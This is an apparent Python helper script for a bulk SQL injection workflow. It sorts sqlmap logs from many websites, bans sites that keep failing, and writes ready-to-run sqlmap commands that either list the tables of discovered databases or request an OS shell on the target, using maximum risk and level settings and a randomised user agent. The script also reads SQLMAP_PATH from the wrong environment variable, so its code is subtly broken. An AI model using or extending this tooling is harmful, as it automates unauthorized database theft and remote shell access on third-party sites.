import time
import sys
import os
import re
from random import randint
from urllib import request
from selenium.common.exceptions import TimeoutException
from selenium import webdriver
from selenium.common.exceptions import NoSuchWindowException
import _thread


BANNING_FILE=os.getenv("BANNING_FILE")
BANNED_KEYWORDS_FILE=os.getenv("BANNED_KEYWORDS_FILE")
SQLMAP_PATH=os.getenv("BANNING_FILE")

def append_site_on_file(site, file_name):

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file))
	#lock = True

	file = open(file_name, "a")

	file.write('%s' % site)
	file.close()

	#lock = False


def test_if_ban(liste, site):
	if site[-1] == '\n':
		site = site[0:-1]
	num_of_tests = 1
	result = False
	for site_to_check in liste:

		if site_to_check.find(site) != -1:

			liste.remove(site_to_check)
			num_of_tests = int(site_to_check.split(":")[1])
			if num_of_tests > 5:
				result = True
				print(site + " banned")
			else:
				num_of_tests = num_of_tests + 1

				result = False
			break
	if not result:

		liste.append(site + ":" + str(num_of_tests) + "\n")
	#while banning_file_lock:
	#	print("waiting for %s To be Unlocked" % (BANNING_FILE))
#	banning_file_lock = True

	files = open(BANNING_FILE, "w")
	files.writelines(liste)
	files.close()

#	banning_file_lock = False

	return result


def filter():
	files = os.listdir("finished")
	for file in files:
		db_list = []
		if file[0] != ".":
			print("Checking file " + file, end="")
			f = open("finished/" + file, "r")
			found = False
			lines = f.readlines()
			if len(lines) > 1:
				site = lines[0]
				if site[-1] == "\n":
					site = site[:-1]
				lines = lines[1:]
			for line in lines:
				if line.find("[*] ") != -1 and line.find("[*] ending") == - \
						1 and line.find("[*] starting") == -1:
					db_list.append(
						line.replace(
							'\n', '')[
							line.find("[*] ") + 4:])
				if line.find("fetched data logged") != -1:
					found = True
			if not found:
				os.remove("finished/" + file)
				print("\n")
				list_of_removed = get_sites(BANNING_FILE)

				if test_if_ban(list_of_removed,
							   file[:-7] + "\n"):
					append_site_on_file(file[:-7] + "\n",BANNED_KEYWORDS_FILE)

			else:
				if len(db_list) > 0:
					print(" Found db\n")
					with open("dbs/" + file, "w+") as result:
						result.write(site + "\n")
						for db in db_list:
							result.write(
								"python " +
								SQLMAP_PATH +
								"/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent -D " %
								(site,
								 ) +
								db +
								" --tables\n")
						result.close()
					os.remove("finished/" + file)
				else:
					print(" Found but not db\n")
					with open("maybe/" + file, "w+") as result:
						result.write(site + "\n")
						result.write( "python " + SQLMAP_PATH + "/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent --os-shell " % (site,  ) + "\n")
						result.close()
					os.remove("finished/" + file)

			f.close()


def get_sites(file_name):

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file_name))
	#lock = True

	files = open(file_name, "r")
	sites = files.readlines()

	return sites


def main():
	exit_err=False
	if BANNING_FILE==None:
		print("Error : You need to set BANNING_FILE\nTry : export BANNING_FILE=\"banned.txt\"")
		exit_err=True
	if BANNED_KEYWORDS_FILE==None:
		print("Error : You need to set BANNED_KEYWORDS_FILE\nTry : export BANNED_KEYWORDS_FILE=\"banningIA.txt\"")
		exit_err=True
	if SQLMAP_PATH==None:
		print("Error : You need to set SQLMAP_PATH\nTry : export SQLMAP_PATH=\"..\"")
		exit_err=True


	if exit_err:
		exit(-1)
	filter()

if __name__ == '__main__':
	main()